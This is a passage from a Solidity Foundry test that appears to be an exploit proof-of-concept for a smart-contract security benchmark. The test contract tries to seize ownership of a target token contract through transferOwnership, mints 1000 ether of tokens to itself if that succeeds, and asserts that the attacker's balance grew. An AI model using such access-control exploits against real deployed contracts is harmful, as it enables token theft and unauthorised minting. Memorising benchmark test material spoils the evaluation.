            abi.encodeWithSignature("transferOwnership(address)", address(this))
        );
        console.log("Transfer ownership attempt:", success3);

        vm.stopPrank();

        // If we became owner, try to mint
        if (success3) {
            // Check if we're now owner
            (, bytes memory newOwnerData) = TARGET.staticcall(
                abi.encodeWithSignature("owner()")
            );
            address newOwner = abi.decode(newOwnerData, (address));
            console.log("New owner:", newOwner);

            if (newOwner == address(this)) {
                // Try to mint as new owner
                vm.startPrank(address(this));
                (bool success4, ) = TARGET.call(
                    abi.encodeWithSignature("mint(address,uint256)", address(this), 1000 ether)
                );
                console.log("New owner mint attempt:", success4);
                vm.stopPrank();
            }
        }

        // Check final balance
        uint256 finalBalance = IERC20(TARGET).balanceOf(address(this));
        console.log("Final attacker token balance:", finalBalance);

        // The oracle expects attacker balance increased
        assertGt(finalBalance, initialBalance, "Token balance should increase");
    }



    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}

